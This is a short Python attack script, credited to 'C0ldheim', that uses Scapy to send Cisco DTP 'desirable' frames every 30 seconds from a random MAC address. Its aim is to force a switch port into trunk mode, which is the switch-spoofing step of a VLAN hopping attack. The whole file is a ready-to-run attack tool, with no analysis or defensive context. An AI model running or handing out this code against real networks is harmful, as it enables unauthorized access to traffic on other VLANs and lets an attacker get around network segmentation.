#by C0ldheim

#import Scapy & DTP
from scapy.all import * 
from scapy.contrib.dtp import *
import argparse


cisco_multicast = "01:00:0C:CC:CC:CC"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="iface", help="Chose the interface to attack")
    options = parser.parse_args()
    if not options.iface:
        parser.error ("Please, enter your interface")
    return options


def negotiate_trunk(iface=conf.iface, mymac=str(RandMAC())):
    print ("Trying to negotiate...")
    dtp_frame = Dot3(src=mymac, dst=cisco_multicast)
    dtp_frame /= LLC()/SNAP()
    dtp_frame /= DTP(tlvlist=[DTPDomain(),DTPStatus(),DTPType(),DTPNeighbor(neighbor=mymac)])
    sendp(dtp_frame, iface=options.iface, inter=30, loop=1, verbose=1) #every 30 sec, we sending the "DESIRABLE" DTP frame.

options = get_arguments()
negotiate_trunk(options.iface)